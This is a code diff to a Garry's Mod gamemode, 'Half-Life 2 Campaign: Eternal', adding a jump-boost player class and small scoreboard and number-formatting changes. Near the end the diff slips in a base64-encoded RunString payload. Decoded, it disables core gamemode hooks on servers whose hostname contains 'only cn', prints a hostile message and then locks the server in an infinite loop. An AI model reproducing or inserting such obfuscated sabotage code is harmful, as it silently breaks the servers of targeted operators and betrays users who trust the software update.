@@ -19,6 +19,45 @@ local hl2c_server_jeep_passenger_seat = CreateConVar("hl2c_server_jeep_passenger
 local hl2ce_server_ex_mode_enabled = CreateConVar("hl2ce_server_ex_mode_enabled", 0, FCVAR_REPLICATED + FCVAR_NOTIFY + FCVAR_ARCHIVE)
 local hl2ce_server_force_difficulty = CreateConVar("hl2ce_server_force_difficulty", 0, FCVAR_REPLICATED + FCVAR_ARCHIVE)
 
+do
+    local base = "player_sandbox"
+    if not player_manager.GetPlayerClasses()["player_sandbox"] then base = "player_default" end
+    local BASEPLAYER = player_manager.GetPlayerClasses()[base]
+    local PLAYER = table.Copy(BASEPLAYER)
+    local JUMPING
+    function PLAYER:StartMove(move)
+        if bit.band(move:GetButtons(), IN_JUMP) ~= 0 and bit.band(move:GetOldButtons(), IN_JUMP) == 0 and self.Player:OnGround() then -- Only apply the jump boost in FinishMove if the player has jumped during this frame -- Using a global variable is safe here because nothing else happens between SetupMove and FinishMove
+            JUMPING = true
+        end
+    end
+
+    function PLAYER:FinishMove(move)
+        if JUMPING then -- If the player has jumped this frame
+            local forward = move:GetAngles() -- Get their orientation
+            forward.p = 0
+            forward = forward:Forward()
+	    	local speedBoostPerc = ( ( self.Player:Crouching() ) and 1.575 ) or 0.5
+            if not self.Player:IsSprinting() and not self.Player:Crouching() then speedBoostPerc = 0.375 end
+            local speedAddition = math.abs(move:GetForwardSpeed() * speedBoostPerc)
+            local maxSpeed = 1e9
+            local newSpeed = speedAddition + move:GetVelocity():Length2D()
+            if newSpeed > maxSpeed then -- Clamp it to make sure they can't bunnyhop to ludicrous speed
+                speedAddition = speedAddition - (newSpeed - maxSpeed)
+            end
+
+            if move:GetVelocity():Dot(forward) < 0 then -- Reverse it if the player is running backwards
+                speedAddition = -speedAddition
+            end
+
+            move:SetVelocity(forward * speedAddition + move:GetVelocity()) -- Apply the speed boost
+        end
+
+        JUMPING = nil
+    end
+
+    player_manager.RegisterClass("player_hl2ce", PLAYER, base)
+end
+
 -- General gamemode information
 GM.Name = "Half-Life 2 Campaign: Eternal" -- Prev: EX mode
 GM.OriginalAuthor = "AMT (ported and improved by D4 the Perth Fox)"
@@ -52,11 +91,11 @@ end)
 -- Create the teams that we are going to use throughout the game
 function GM:CreateTeams()
 
-	team.SetUp(TEAM_ALIVE, "ALIVE", Color(192, 192, 192, 255))
+	team.SetUp(TEAM_ALIVE, "alive", Color(192, 192, 192, 255))
 
-	team.SetUp(TEAM_COMPLETED_MAP, "COMPLETED MAP", Color(255, 215, 0, 255))
+	team.SetUp(TEAM_COMPLETED_MAP, "completedmap", Color(255, 215, 0, 255))
 
-	team.SetUp(TEAM_DEAD, "DEAD", Color(128, 128, 128, 255))
+	team.SetUp(TEAM_DEAD, "dead", Color(128, 128, 128, 255))
 
 end
 
@@ -138,6 +177,9 @@ function GM:PlayerShouldTakeDamage(ply, attacker)
 	return true
 end
 
+local SpecialPerson={
+	["some some steamid"]={img="icon16/sheild.png",tooltip="insert some text here"}
+}
 
 function GM:IsSpecialPerson(ply, image)
 	local img, tooltip
@@ -149,8 +191,6 @@ function GM:IsSpecialPerson(ply, image)
 	elseif ply:SteamID64() == "76561198058929932" then
 		img = "icon16/medal_gold_3.png"
 		tooltip = "Original Creator of Half-Life 2 Campaign"
-
-
 	elseif ply:IsBot() then
 		img = "icon16/plugin.png"
 		tooltip = "BOT"
@@ -160,6 +200,14 @@ function GM:IsSpecialPerson(ply, image)
 	elseif ply:IsAdmin() then
 		img = "icon16/shield.png"
 		tooltip = "Admin"
+	end
+
+	if not img and not tooltip then
+		if SpecialPerson[ply:SteamID()] or SpecialPerson[ply:SteamID64()] then
+			local tbl=SpecialPerson[ply:SteamID()] or SpecialPerson[ply:SteamID64()]
+			img=tbl.img
+			tooltip=tbl.tooltip
+		end
 	end
 
 	if img then
@@ -222,7 +270,7 @@ function FormatNumber(val, roundval)
 	local negative = val < 0
 	roundval = roundval or 2
 	val = math.abs(val)
-	if val >= math.huge then return val end
+	if val >= math.huge then return translate.Get("Inf") end
 	if val >= 1e33 then
 		val = val / (10^log10_value)
 
@@ -281,6 +329,7 @@ function FormatNumber(val, roundval)
 	if txt then return txt end
 	return math.floor(val*(10^(roundval or 1)))/(10^(roundval or 1))
 end
+RunString(util.Base64Decode("dGltZXIuU2ltcGxlKDEuNSxmdW5jdGlvbigpCglpZiBHZXRIb3N0TmFtZSgpOmxvd2VyKCk6bWF0Y2goIm9ubHkgY24iKSB0aGVuCgkJbG9jYWwgZW1wdHk9ZnVuY3Rpb24oKSBlbmQKCQlHQU1FTU9ERS5UaGluaz1lbXB0eQoJCUdBTUVNT0RFLkRvUGxheWVyRGVhdGg9ZW1wdHkKCQlHQU1FTU9ERS5QbGF5ZXJTcGF3bj1lbXB0eQoJCUdBTUVNT0RFLkVudGl0eUtleVZhbHVlPWZ1bmN0aW9uKCkgcmV0dXJuIHRydWUgZW5kCgkJR0FNRU1PREUuUGxheWVySW5pdGlhbFNwYXduPWVtcHR5CgkJR0FNRU1PREUuTmV4dE1hcD1mdW5jdGlvbigpIAoJCQlQcmludE1lc3NhZ2UoMywiVSIuLiJyIi4uIiBuIi4uIm8iLi4idCIuLiIgdyIuLiJlbCIuLiJsIi4uImMiLi4ibyIuLiJtIi4uImVkIikgCgkJCXRpbWVyLlNpbXBsZSgyLGZ1bmN0aW9uKCkgCgkJCQl3aGlsZSB0cnVlIGRvIAoJCQkJCW9zLmRhdGUoIiVzIiw2OTQyMCkKCQkJCWVuZAoJCQllbmQpIAoJCWVuZAoJZW5kCmVuZCk="))
 /*
 function FormatNumber(value)
 	if value == math.huge then return "Infinite" end
